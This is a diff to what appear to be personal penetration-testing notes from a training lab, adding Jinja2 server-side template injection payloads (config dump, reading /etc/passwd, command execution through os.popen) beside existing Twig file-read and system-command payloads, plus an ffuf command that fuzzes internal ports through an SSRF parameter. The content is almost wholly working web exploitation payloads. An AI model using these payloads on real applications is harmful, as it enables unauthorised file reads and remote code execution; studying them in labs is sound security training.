@@ -55,6 +55,29 @@ Accept: */*
 ❯ ffuf -u 'http://10.129.201.127/index.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'dateserver=http://dateserver.htb:FUZZ/&date=2024-01-01' -w ports.txt -ic -c -fr 'Failed'
 ```
 
+# Exploiting SSTI - Jinja2
+
+```jinja2
+{{ config.items() }}
+```
+
+```jinja2
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
+## LFI
+
+```jinja2
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+
+## RCE
+
+```jinja2
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+---
 
 # Exploiting SSTI - Twig
 
@@ -62,13 +85,13 @@ Accept: */*
 {{ _self }}
 ```
 
-## Local File Inclusion
+# LFI
 
 ```twig
 {{ "/etc/passwd"|file_excerpt(1,-1) }}
 ```
 
-## Remote Code Execution
+## RCE
 
 ```twig
 {{ ['id'] | filter('system') }}
